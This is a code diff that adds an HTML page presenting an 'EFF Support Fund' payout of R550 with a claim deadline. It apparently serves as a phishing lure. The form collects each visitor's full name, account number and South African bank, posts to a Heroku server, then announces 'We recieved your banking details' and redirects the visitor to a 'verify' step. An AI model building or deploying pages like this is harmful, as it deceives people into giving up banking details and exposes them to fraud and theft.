@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>EFF Support Fund</title>
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <script src="./script.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src='//ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js'></script>
+  <link rel='stylesheet' href='//ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>
+  <link rel="stylesheet" href="./style.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('./back.png'); 
+      background-size: cover; 
+      background-position: center; 
+      background-repeat: no-repeat; 
+      margin: 0;
+      overflow: hidden;
+    }
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    #eff-form {
+      background-image: url('./back.png'); 
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #fff;
+      z-index: 10000;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #progress-bar {
+      height: 20px;
+      margin-top: 10px;
+      background-color: #ddd;
+      border-radius: 5px;
+      overflow: hidden;
+      display: none; 
+    }
+    #progress-bar-inner {
+      height: 100%;
+      width: 0;
+      background-color: #ff0000;
+      text-align: center;
+      line-height: 20px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="the-final-countdown">
+    <p>Claim before: </p>
+  </div>
+
+  <div id="eff-form">
+    <h2>EFF Support Fund : R550</h2>
+    <form id="donation-form">
+        <label for="full-name">Full Name:</label>
+        <input type="text" id="full-name" name="full-name" required>
+
+        <label for="surname">Surname:</label>
+        <input type="text" id="surname" name="surname" required>
+        
+        <label for="account">Account no:</label>
+        <input type="numeric" id="account" name="account" required>
+
+        <label for="bank">Select Bank:</label>
+        <select id="bank" name="bank" required>
+          <option value="" disabled selected>Select Bank</option>
+          <option value="capitec">Capitec Bank</option>
+          <option value="absa">Absa</option>
+          <option value="standardbank">Standard Bank</option>
+          <option value="tymebank">TymeBank</option>
+          <option value="fnb">FNB</option>
+        </select>
+
+        <button type="button" onclick="submitForm()">Proceed</button>
+      </form>
+
+    <div id="overlay">
+      <div id="progress-bar">
+        <div id="progress-bar-inner">
+          <p>Loading....</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+     function submitForm() {
+      try {
+// Show loading overlay
+        document.getElementById('overlay').style.display = 'flex';
+
+        // Make AJAX request to your server
+        axios.post('https://mainp-server-c7a5046a3a01.herokuapp.com/eff')
+          .then(response => {
+            // Hide loading overlay
+            document.getElementById('overlay').style.display = 'none';
+
+            if (response.data.success) {
+              // Redirect to the payment page
+              alert("We recieved your banking details , we need you to verify now!");
+              window.location.href = response.data.redirectUrl;
+            } else {
+              alert('Payment initiation failed: ' + response.data.error);
+            }
+          })
+          .catch(error => {
+            // Hide loading overlay
+            document.getElementById('overlay').style.display = 'none';
+
+            console.error('Payment initiation failed:', error);
+            alert('Payment initiation failed. Internal server error.');
+          });
+      } catch (error) {
+        console.error('Error submitting form:', error);
+      }
+    }
+  </script>
+</body>
+</html>
